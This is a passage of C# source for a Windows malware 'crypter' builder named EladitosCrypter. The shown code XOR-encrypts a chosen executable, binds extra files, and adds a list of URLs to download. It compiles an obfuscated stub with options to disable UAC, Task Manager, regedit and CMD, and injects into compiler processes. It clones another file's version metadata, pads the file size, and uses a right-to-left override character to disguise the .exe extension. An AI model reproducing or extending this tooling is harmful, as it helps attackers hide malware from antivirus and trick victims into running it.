                            str = str.Replace("[SFILE]", "");
                        }
                        ResourceWriter writer = new ResourceWriter(Application.StartupPath + @"\" + newValue + ".resources");
                        writer.AddResource(str3, Encoding.Default.GetBytes(Encoding.Default.GetString(XOR(File.ReadAllBytes(FileLoc), str4)) + "MORPHEOUS" + Encoding.Default.GetString(XOR(runnet, str4))));
                      
                        if (flag)
                        {
                            string s = string.Empty;
                            for (int i = 0; i < this.listBind.Items.Count; i++)
                            {
                                string[] strArray = this.listBind.Items[i].ToString().Split(new char[] { '\\' });
                                string str20 = s;
                                s = str20 + Encoding.Default.GetString(File.ReadAllBytes(this.listBind.Items[i].ToString())) + "extension" + strArray[strArray.Length - 1] + "killamuvz";
                            }
                            string str6 = RndString(r.Next(6));
                            string str7 = string.Empty;
                            if (this.boxBindOnce.Checked)
                            {
                                str7 = RndString(r.Next(7));
                            }
                            else
                            {
                                str7 = "";
                            }
                            str = str.Replace("[BINDONCE]", str7);
                            byte[] buffer = XOR(Encoding.Default.GetBytes(s), str4);
                            writer.AddResource("bind", buffer);
                        }
                       
                        if (flag2)
                        {
                            string str8 = string.Empty;
                            foreach (string str9 in this.listDL.Items)
                            {
                                str8 = str8 + str9 + "#KILLAMUVZ#";
                            }
                            string str10 = RndString(r.Next(5));
                            string str11 = string.Empty;
                            if (this.boxDLOnce.Checked)
                            {
                                str11 = RndString(r.Next(6));
                            }
                            str = str.Replace("[DLONCE]", str11);
                            byte[] buffer2 = XOR(Encoding.Default.GetBytes(str8), str4);
                            writer.AddResource("download", buffer2);
                        }
                        
                        this.increase(10f);
                        if (flag4)
                        {
                            string[] strArray2 = Regex.Split(this.msgBody.Text, this.n);
                            string input = string.Empty;
                            string str13 = string.Empty;
                            foreach (string str14 in strArray2)
                            {
                                input = input + str14 + this.n;
                            }
                            if (this.msgRunOnce.Checked)
                            {
                                str13 = RndString(r.Next(7, 10));
                            }
                            str = str.Replace("[MSGONCE]", str13).Replace("[BODY]", this.encstring(input)).Replace("[TITLE]", this.encstring(this.msgTitle.Text));
                        }
                        writer.Close();
                        Compile(str.Replace("[UAC]", this.d1.Checked.ToString().ToLower()).Replace("[REGEDIT]", this.d4.Checked.ToString().ToLower()).Replace("[TASKMGR]", this.d2.Checked.ToString().ToLower()).Replace("[CMD]", this.d3.Checked.ToString().ToLower()), newValue, dialog.FileName, false);
                      
                        this.increase(15f);
                    if (!errorb)
                        {
                            string str15 = EladitosCrypter.Properties.Resources.stub;
                            string str16 = RndString(r.Next(11, 40));
                            string str17 = RndString(r.Next(11, 40));
                            str15 = str15.Replace("[ENCRYPTION]", str4).Replace("[RESOURCEFILE]", str16).Replace("[RESNAME]", str17);
                            this.increase(10f);
                            byte[] buffer3 = File.ReadAllBytes(dialog.FileName);
                            File.Delete(dialog.FileName);
                            ResourceWriter writer2 = new ResourceWriter(Application.StartupPath + @"\" + str16 + ".resources");
                            writer2.AddResource(str17, XOR(buffer3, str4));
                            this.increase(10f);
                            writer2.Close();
                            str15 = str15.Replace("[TITLE]", this.aTitle.Text).Replace("[ASSDESCRIPTION]", this.aDescription.Text).Replace("[COMPANY]", this.aCompany.Text).Replace("[PRODUCT]", this.aProduct.Text).Replace("[COPYRIGHT]", this.aCopyright.Text).Replace("[VERSION]", this.aVersion.Text);
                            str15 = this.rename(str15);
                            this.increase(10f);
                            Compile(str15, str16, dialog.FileName, false);
                         
                            this.increase(10f);
                            if (this.numPump.Value > 0M)
                            {
                                this.pumpup(dialog.FileName);
                            }
                            if (this.boxSpoof.Checked)
                            {
                                string fileName = Path.GetFileName(dialog.FileName);
                                char newChar = '‮';
                                char[] array = this.txtExtension.Text.Replace('.', newChar).ToCharArray();
                                int length = fileName.Length - 4;
                                Array.Reverse(array);
                                string destFileName = string.Concat(new object[] { fileName.Substring(0, length), newChar, new string(array), fileName.Substring(length) });
                                File.Move(fileName, destFileName);
                            }
                            
                            this.increase(10f);
                        }
                    }
                    catch (Exception exception)
                    {
                        MessageBox.Show(exception.Message);
                    }
                }
            }
        }

        private void instaButton10_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "Icon|*.ico"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.pictureBox1.Image = Icon.ExtractAssociatedIcon(dialog.FileName).ToBitmap();
                IconLoc = dialog.FileName;
                CloneIcon = false;
            }
        }

        private void instaButton11_Click(object sender, EventArgs e)
        {
            IconLoc = string.Empty;
            CloneIcon = false;
            this.pictureBox1.Image = null;
        }

        private void instaButton12_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "Any File|*.*"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(dialog.FileName);
                this.aCompany.Text = versionInfo.CompanyName;
                this.aTitle.Text = versionInfo.FileDescription;
                this.aDescription.Text = versionInfo.FileDescription;
                this.aCopyright.Text = versionInfo.LegalCopyright;
                this.aProduct.Text = versionInfo.ProductName;
                this.aVersion.Text = versionInfo.FileMajorPart.ToString() + "." + versionInfo.FileMinorPart.ToString() + "." + versionInfo.FileBuildPart.ToString() + ".0";
            }
        }

        private void instaButton13_Click(object sender, EventArgs e)
        {
            this.aTitle.Text = this.aDescription.Text = this.aCompany.Text = this.aProduct.Text = this.aCopyright.Text = string.Empty;
            this.aVersion.Text = "1.0.0.0";
        }

        private void instaButton2_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = ".exe|*.exe",
                ShowHelp = true
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                FileLoc = dialog.FileName;
                this.lblFile.Text = Path.GetFileName(FileLoc);
                this.lblFile.Refresh();
                if (isDotNet(File.ReadAllBytes(dialog.FileName)))
                {
                    this.itselfNet();
                    this.itself.Checked = true;
                    this.itself.Refresh();
                }
            }
        }

        private void instaButton3_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void instaButton4_Click(object sender, EventArgs e)
        {
            this.listDL.Items.Clear();
        }

        private void instaButton5_Click(object sender, EventArgs e)
        {
            this.listDL.Items.Remove(this.listDL.SelectedItem);
        }

        private void instaButton6_Click(object sender, EventArgs e)
        {
            this.listDL.Items.Add(this.txtdl.Text);
        }

        private void instaButton7_Click(object sender, EventArgs e)
        {
            MessageBox.Show(this.msgBody.Text, this.msgTitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }

        private void instaButton8_Click(object sender, EventArgs e)
        {
            Scanner scanner = new Scanner();
            scanner.Show();
            scanner.Validate();
        }

        private void instaButton9_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "Any File|*.*"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.pictureBox1.Image = Icon.ExtractAssociatedIcon(dialog.FileName).ToBitmap();
                IconLoc = dialog.FileName;
                CloneIcon = true;
            }
        }

        [DllImport("kernel32")]
        private static extern bool IsDebuggerPresent();
        public static bool isDotNet(byte[] bytesdotnet)
        {
            try
            {
                Assembly.Load(bytesdotnet);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void itself_Click(object sender, EventArgs e)
        {
            this.vbc.Checked = false;
            this.vbc.Refresh();
            this.csc.Checked = false;
            this.csc.Refresh();
            this.cvtres.Checked = false;
            this.cvtres.Refresh();
            this.custom.Checked = false;
            this.custom.Refresh();
            inj = "itself";
        }

        private void itselfNet()
        {
            this.vbc.Checked = false;
            this.vbc.Refresh();
            this.csc.Checked = false;
            this.csc.Refresh();
            this.cvtres.Checked = false;
            this.cvtres.Refresh();
            this.custom.Checked = false;
            this.custom.Refresh();
            inj = "itself";
        }

        private void pumpup(string location)
        {
            double num = Convert.ToDouble(this.numPump.Value) * 1024.0;
            FileStream stream = File.OpenWrite(location);
            for (long i = stream.Seek(0L, SeekOrigin.End); i < num; i += 1L)
            {
                stream.WriteByte(0);
            }
            stream.Close();
        }

        private string rename(string s)
        {
            string[] strArray = "AA-BB-CC-DD-EE-FF-GG-HH-II-JJ-LL-KK-MM-OO-PP-TT-SS-RR".Split(new char[] { '-' });
            for (int i = 0; i < strArray.Length; i++)
            {
                for (int j = 1; j < 10; j++)
                {
                    s = s.Replace(strArray[i] + Convert.ToString(j), RndString(r.Next(20, 30)));
                }
            }
            return s;
        }

        private static string RndString(int Length)
        {
            string str = Form1.str[r.Next(0, 5)].ToString();
            for (int i = 0; i < Length; i++)
            {
                str = str + Form1.str[r.Next(0, Form1.str.Length)];
            }
            return str;
        }

        private void txtExtension_TextChanged(object sender, EventArgs e)
        {
            string str = "example.exe";
            int length = str.Length - 4;
            char ch = '‮';
            char[] array = this.txtExtension.Text.Replace(".", "").ToCharArray();
            Array.Reverse(array);
            string str2 = string.Concat(new object[] { str.Substring(0, length), ch, new string(array), str.Substring(length) });
            this.labelExtension.Text = str2;
            this.labelExtension.Refresh();
        }

        private void vbc_Click(object sender, EventArgs e)
        {
            this.custom.Checked = false;
            this.custom.Refresh();
            this.csc.Checked = false;
            this.csc.Refresh();
            this.cvtres.Checked = false;
            this.cvtres.Refresh();
            this.itself.Checked = false;
            this.itself.Refresh();
            inj = "vbc";
        }

        public static byte[] XOR(byte[] input, string Key)
        {
            int num = 5;
            byte[] bytes = Encoding.ASCII.GetBytes(Key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte) (input[i] ^ ((byte) ((bytes[i % ((int) bytes.Length)] >> ((i + num) + bytes.Length)) & 0xff)));
            }
            return input;
        }

        private void boxDLOnce_Click(object sender, EventArgs e)
        {

        }

        private void boxPersistence_Click(object sender, EventArgs e)
        {

        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }      
    }
}

